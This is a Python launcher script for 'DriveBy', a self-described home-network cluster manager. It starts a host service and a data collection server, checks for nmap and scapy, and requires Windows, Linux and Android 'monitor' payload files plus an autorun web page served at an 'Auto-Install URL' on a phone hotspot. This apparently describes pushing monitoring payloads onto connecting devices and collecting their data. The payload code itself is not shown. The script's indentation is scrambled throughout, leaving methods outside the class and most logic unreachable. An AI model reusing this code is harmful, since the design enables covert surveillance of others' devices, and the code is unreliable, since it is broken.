#!/usr/bin/env python3
"""
DriveBy Startup Script
Easy launcher for the DriveBy home network cluster management system
"""

import os
import sys
import time
import json
import subprocess
import threading
import signal
from datetime import datetime

class DriveByLauncher:
    def __init__(self):
        self.processes = []
        self.running = True
        self.config = self.load_config()

    def load_config(self):
        """Load configuration from config.json"""
        try:
            with open('config.json', 'r') as f:
                return json.load(f)
        except FileNotFoundError:
                print("Warning: config.json not found, using defaults")
                return {
                "server": {"host": "0.0.0.0", "port": 8080, "data_port": 8081},
                "network": {"scan_interval": 5}
                }

    def check_dependencies(self):
        """Check if required dependencies are installed"""
        print("Checking dependencies...")

        required_modules = [
        'flask', 'requests', 'psutil', 'netifaces',
        'nmap', 'scapy', 'watchdog', 'cryptography'
        ]

        missing_modules = []
        for module in required_modules:
            try:
                __import__(module)
                print(f" ✓ {module}")
            except ImportError:
                missing_modules.append(module)
                print(f" ✗ {module} (missing)")

                if missing_modules:
                    print(f"\nMissing dependencies: {', '.join(missing_modules)}")
                    print("Install with: pip install -r requirements.txt")
                    return False

                    print("All dependencies satisfied!")
                    return True

def check_environment(self):
    """Check if running in appropriate environment"""
    print("Checking environment...")

    # Check if running on Android/Termux
    is_termux = os.path.exists('/data/data/com.termux') or 'termux' in os.getenv('PREFIX', '').lower()
    if is_termux:
        print(" ✓ Termux environment detected")
    else:
        print(" ! Not running in Termux (may work on other platforms)")

        # Check Python version
        python_version = sys.version_info
        if python_version >= (3, 6):
            print(f" ✓ Python {python_version.major}.{python_version.minor}")
        else:
            print(f" ✗ Python {python_version.major}.{python_version.minor} (requires 3.6+)")
            return False

            # Check if files exist
            required_files = [
            'phone_host.py', 'data_server.py', 'config.json',
            'payloads/windows_monitor.ps1', 'payloads/linux_monitor.py',
            'payloads/android_monitor.py', 'web/autorun.html'
            ]

            for file_path in required_files:
                if os.path.exists(file_path):
                    print(f" ✓ {file_path}")
                else:
                    print(f" ✗ {file_path} (missing)")
                    return False

                    return True

def create_data_directory(self):
    """Create data storage directory"""
    data_path = self.config.get('data', {}).get('storage_path', 'collected_data')
    os.makedirs(data_path, exist_ok=True)
    print(f"Data directory: {data_path}")

def start_host_service(self):
    """Start the main host service"""
    print("Starting DriveBy Host Service...")

    try:
        process = subprocess.Popen([
        sys.executable, 'phone_host.py'
        ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        self.processes.append(('Host Service', process))
        return process

    except Exception as e:
        print(f"Error starting host service: {e}")
        return None

def start_data_server(self):
    """Start the data collection server"""
    print("Starting Data Collection Server...")

    try:
        process = subprocess.Popen([
        sys.executable, 'data_server.py'
        ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        self.processes.append(('Data Server', process))
        return process

    except Exception as e:
        print(f"Error starting data server: {e}")
        return None

def monitor_processes(self):
    """Monitor running processes and display output"""
def monitor_process(name, process):
    while self.running and process.poll() is None:
        try:
            line = process.stdout.readline()
            if line:
                timestamp = datetime.now().strftime('%H:%M:%S')
                print(f"[{timestamp}] {name}: {line.strip()}")
        except Exception as e:
                print(f"Error monitoring {name}: {e}")
                break

                # Start monitoring threads for each process
                for name, process in self.processes:
                    thread = threading.Thread(target=monitor_process, args=(name, process), daemon=True)
                    thread.start()

def display_info(self):
    """Display system information and URLs"""
    host_port = self.config['server']['port']
    data_port = self.config['server']['data_port']

    print("\n" + "="*60)
    print(" DriveBy - Home Network Cluster Management")
    print("="*60)
    print(f"Host Service: http://localhost:{host_port}")
    print(f"Data Dashboard: http://localhost:{data_port}/dashboard")
    print(f"Auto-Install URL: http://[your-hotspot-ip]:{host_port}")
    print("="*60)
    print("\nSystem Status:")
    for name, process in self.processes:
        status = "Running" if process.poll() is None else "Stopped"
        print(f" {name}: {status}")
        print("\nPress Ctrl+C to stop all services")
        print("="*60)

def signal_handler(self, signum, frame):
    """Handle shutdown signals"""
    print(f"\nReceived signal {signum}, shutting down...")
    self.shutdown()

def shutdown(self):
    """Shutdown all services"""
    print("\nShutting down DriveBy services...")
    self.running = False

    for name, process in self.processes:
        if process.poll() is None:
            print(f"Stopping {name}...")
            process.terminate()

            # Wait for graceful shutdown
            try:
                process.wait(timeout=5)
                print(f" ✓ {name} stopped")
            except subprocess.TimeoutExpired:
                print(f" ! Force killing {name}")
                process.kill()

                print("All services stopped.")

def run(self):
    """Main run method"""
    print(" DriveBy Launcher Starting...")
    print("="*50)

    # Setup signal handlers
    signal.signal(signal.SIGINT, self.signal_handler)
    signal.signal(signal.SIGTERM, self.signal_handler)

    # Pre-flight checks
    if not self.check_dependencies():
        return 1

        if not self.check_environment():
            return 1

            # Setup
            self.create_data_directory()

            # Start services
            host_process = self.start_host_service()
            if not host_process:
                print("Failed to start host service")
                return 1

                # Wait a moment for host service to start
                time.sleep(2)

                data_process = self.start_data_server()
                if not data_process:
                    print("Failed to start data server")
                    self.shutdown()
                    return 1

                    # Wait for services to initialize
                    time.sleep(3)

                    # Start monitoring
                    self.monitor_processes()

                    # Display information
                    self.display_info()

                    # Main loop
                    try:
                        while self.running:
                            # Check if processes are still running
                            all_running = all(process.poll() is None for _, process in self.processes)
                            if not all_running:
                                print("One or more services stopped unexpectedly")
                                break

                                time.sleep(1)

                    except KeyboardInterrupt:
                                pass
                    finally:
                                self.shutdown()

                                return 0

def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(description='DriveBy Launcher')
    parser.add_argument('--check-only', action='store_true', help='Only check dependencies and environment')
    parser.add_argument('--host-only', action='store_true', help='Start only the host service')
    parser.add_argument('--data-only', action='store_true', help='Start only the data server')

    args = parser.parse_args()

    launcher = DriveByLauncher()

    if args.check_only:
        print("Running pre-flight checks only...")
        deps_ok = launcher.check_dependencies()
        env_ok = launcher.check_environment()

        if deps_ok and env_ok:
            print("\n All checks passed! Ready to run DriveBy.")
            return 0
        else:
            print("\n Some checks failed. Please fix the issues above.")
            return 1

            if args.host_only:
                print("Starting host service only...")
                launcher.start_host_service()
                launcher.monitor_processes()
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                        launcher.shutdown()
                        return 0

                        if args.data_only:
                            print("Starting data server only...")
                            launcher.start_data_server()
                            launcher.monitor_processes()
                            try:
                                while True:
                                    time.sleep(1)
                            except KeyboardInterrupt:
                                    launcher.shutdown()
                                    return 0

                                    # Run full system
                                    return launcher.run()

                                    if __name__ == "__main__":
                                        sys.exit(main())
